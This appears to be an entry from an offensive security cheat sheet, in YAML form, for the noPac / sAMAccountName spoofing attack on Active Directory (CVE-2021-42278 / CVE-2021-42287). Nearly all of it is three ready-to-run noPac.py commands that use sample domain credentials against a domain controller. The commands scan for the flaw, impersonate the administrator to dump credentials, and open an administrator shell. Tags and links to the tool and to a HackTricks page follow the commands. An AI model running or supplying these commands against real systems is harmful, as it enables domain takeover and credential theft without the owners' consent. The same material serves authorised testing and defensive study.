---
description: |
  noPac / sAMAccountName spoofing (CVE-2021-42278 / CVE-2021-42287) — exploit machine account name impersonation to gain Domain Admin privileges via forged Kerberos tickets.
commands:
  - have: Credentials
    cmd: |
      python3 noPac.py senshu.local/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -dc-host DC01 -scan
      python3 noPac.py senshu.local/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -dc-host DC01 --impersonate administrator -dump
      python3 noPac.py senshu.local/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -dc-host DC01 --impersonate administrator -shell
phase:
  - Exploitation
target_os:
  - Windows
services:
  - Kerberos
techniques:
  - CVE_Exploit
references:
  - https://github.com/Ridter/noPac
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/samaccountname-spoofing.html
---
